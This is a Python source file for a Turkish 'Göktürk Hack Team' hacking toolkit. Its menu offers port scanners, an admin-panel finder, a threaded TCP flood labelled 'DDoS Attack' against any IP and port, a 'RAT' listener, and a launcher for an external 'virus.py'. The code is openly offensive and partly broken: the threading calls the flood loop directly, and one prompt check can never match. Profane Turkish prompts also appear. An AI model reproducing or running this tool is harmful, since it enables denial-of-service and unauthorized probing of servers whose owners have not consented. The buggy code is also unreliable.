#Oluşturucu LordSUCCSES
#Geliştirici Utq-li

#discord : utqli15101 | lordsuccses

import os
import socket
import threading
import time
from time import sleep
import tkinter as tk
import webbrowser
import requests
from bs4 import BeautifulSoup

class Color:
    RED = "\033[0;31m"
    BOLD = "\033[1m"
    YELLOW = "\033[1;33m"
    CYAN = "\033[0;36m"

def github():
    webbrowser.open("https://github.com/LordSUCCSES")

def findip():
    url = input("Enter Web Site: ")
    name = input("Enter Web Site Name: ")
    s = socket.gethostbyname(url)
    print(s + ": " + name + "\n GOKTURK HACK TEAM")

def scan_port():
    ip = input("Enter IP: ")
    for port in range(1000):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.settimeout(0.2)
            server.connect((ip, port))
            print(f"Port Finding {port}\nGÖKTÜRK HACK TEAM")
            server.close()
            break
        except socket.error as e:
            print(f"Port Not Finding: {port}")

def send_data():
    ip = input("Enter Web Site IP: ")
    port = int(input("Enter Web Site Port: "))
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((ip, port))
        data = input("Write What You Want To Send: ")
        server.send(data.encode("utf-8"))
        server.close()
        print(f"Sent Successfully, Message: {data}\nGÖKTÜRK HACK TEAM")
    except socket.error:
        print("Data Not Send\n GÖKTÜRK HACK TEAM")

def open():
    window = tk.Tk()
    window.geometry("350x100")
    window.title("Göktürk Hack Team")
    window.resizable(False, False)
    label = tk.Label(text="GÖKTÜRK HACK TEAM\n\nVersion: 1.0.0.0")
    label.pack()
    button = tk.Button(text="LordSUCCSES Github", command=github)
    button.pack(side="bottom")
    window.mainloop()

def myip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        sleep(5)
        print("Your IP: " + ip)
    except ValueError:
        print("Error!")

def myport():
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    for port in range(1000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect((ip, port))
            print(f"You Port Find: {port}")
            s.close()
            break
        except socket.error:
            pass

def customscan():
    ip = input("Enter Custom IP: ")
    for port in range(1000):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.settimeout(0.1)
            server.connect((ip, port))
            print(f"Port Finding, Port: {port}")
            break
        except socket.error:
            print(f"Port Not Finding: {port}")

def pcname():
    name = socket.gethostname()
    print(f"Your Computer Name: {name}")

def adminfind():
    found = []
    url = input("Enter Url (Exaple: https//exaple.com): ")
    req = ["/admin/", "/adminpp/", "/adminpanel/", "/administor/", "/admins/", "/registration/admin.php", "/feedback/alumini/admin.php"]
    leng = len(req)
    for i in range(leng):
        admin = url + req[i]
        print(admin)
        res = requests.get(admin)
        if res.status_code == 200:
            soup = BeautifulSoup(res.text, 'html.parser')
            title = soup.find('h1')
            if title:
                print(f"Finding Title: {title.text}")
                found.append(admin)
        else:
            print("Connection Not Found...")
    fleng = len(found)
    if fleng > 0:
        print(Color.CYAN + "Found Admin Panel\n")
        print(Color.CYAN + str(found))
    else:
        print(Color.RED + "Admin Panel Not Found")

anum = 0

class ddosattack():
    def ddos(ip = "", port = 0):
        global anum
        while True:
            try:
                ADDR = (ip, port)
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect(ADDR)
                data = (("GET / " + "HTTP").encode("utf-8"))
                [
                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
                    "BuBirDDoS'tur:)))))BozkurtTim"
                ]
                server.send(data)
                server.close()

                anum += 1
                print(anum)
            except socket.error as e:
                print("Error!")

def startddos():
    try:
        ip = input("Enter IP: ")
        port = int(input("Enter Port: "))
        thread = int(input("Enter Threading: "))

        for i in range(thread):
            t = threading.Thread(target=ddosattack.ddos(ip, port))
            t.start()
            print("The program has been launched successfully!")

        return ip, port, thread, t

    except ValueError:
        print("Error!")
        time.sleep(2)
        choice()

def rat_listen():
    try:
        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        port = 24

        i = str(input(f"IP'niz {ip} budur kullanmak istiyor musunuz? (evet/hayır): ")).upper()
        if i == "evet":
            pass
        elif i == "hayır":
            ip = input("İstediğiniz IP giriniz: ")
        else:
            print("Ya bi siktir git")
            exit()

        p = str(input(f"Varsayılan port'unuz {port} budur kullanmak istiyor musunuz? (evet/hayır): ")).upper()

        if p == "evet":
            pass
        elif p ==  "hayır":
            port = int(input("İstediğiniz portu giriniz: "))
        else:
            print("Ya siktir git lan")
            exit()

        ADDR = (ip, port)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)
        server.listen(1)
        print(f"Bu {ip} IP Dinlemeye Alındı")

        while True:
            client, addr=server.accept()
            print(f"Girdi: {addr}")
    except ValueError:
        print("Error!")
        rat_listen()

def virus():
    try:
        os.system("python3 virus.py")
    except ValueError:
        print("Error!")
    except FileNotFoundError:
        print("virus.py not found! please download it.")

def bruteforce():
    pass

def choice():
    try:
        print("1: Find Web IP\n2: Scan Web Port\n3: Web Server Send To Data\n4: My IP\n5: My Find Port\n6: My Computer Name\n7: Custom Port Scan\n8: Admin Page Finding\n9: DDoS Attack\n10: Listen To RAT\n11: Virus (Only Windows)\n12: Bruteforce\n13: Who Are We")
        i = int(input("Enter Command: "))
        if i == 1:
            findip()
        elif i == 2:
            scan_port()
        elif i == 3:
            send_data()
        elif i == 4:
            myip()
        elif i == 5:
            myport()
        elif i == 6:
            pcname()
        elif i == 7:
            customscan()
        elif i == 8:
            adminfind()
        elif i == 9:
            startddos()
        elif i == 10:
            rat_listen()
        elif i == 11:
            virus()
        elif i == 12:
            bruteforce()
        elif i == 13:
            open()
        else:
            print("Invalid number!")
            choice()

    except ValueError:
        print("Error!")

choice()

